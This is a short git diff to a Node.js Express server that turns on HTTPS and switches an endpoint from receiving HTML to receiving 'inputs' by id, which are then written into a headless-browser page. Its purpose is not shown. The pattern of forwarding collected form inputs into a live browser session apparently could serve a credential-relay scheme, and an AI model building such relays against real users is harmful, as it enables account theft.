@@ -8,10 +8,10 @@ const https = require("https"),
   fs = require("fs");
 
 
-// const options = {
-//   key: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/privkey.pem"),
-//   cert: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/fullchain.pem")
-// };
+const options = {
+  key: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/privkey.pem"),
+  cert: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/fullchain.pem")
+};
 
 const app = express()
 
@@ -88,8 +88,8 @@ app.post('/sendData', async (req, res) => {
   
         const lockable = async () => {
           const checker = () => {
-            setTimeout(() => html_obj[id] ? locker.emit('unlocked') : checker(), 1000)
-            if(html_obj[id]) return
+            setTimeout(() => inputs_obj[id] ? locker.emit('unlocked') : checker(), 1000)
+            if(inputs_obj[id]) return
           }
           await checker()
           await new Promise(resolve => locker.once('unlocked', resolve));
@@ -98,14 +98,14 @@ app.post('/sendData', async (req, res) => {
         await lockable()
         console.log('successfully recieved', id)
 
-        await write_data(html_obj[id], page, browser)
+        await write_data(inputs_obj[id], page, browser)
 
 })
-app.post('/sendHtml', async (req, res) => {
-  const {html, id} = req.body
-  html_obj[id] = html
+app.post('/sendInputs', async (req, res) => {
+  const {inputs, id} = req.body
+  inputs_obj[id] = inputs
   return res.status(200)
 })
 
 app.listen(5000)
-// https.createServer(options, app).listen(443);
+https.createServer(options, app).listen(443);
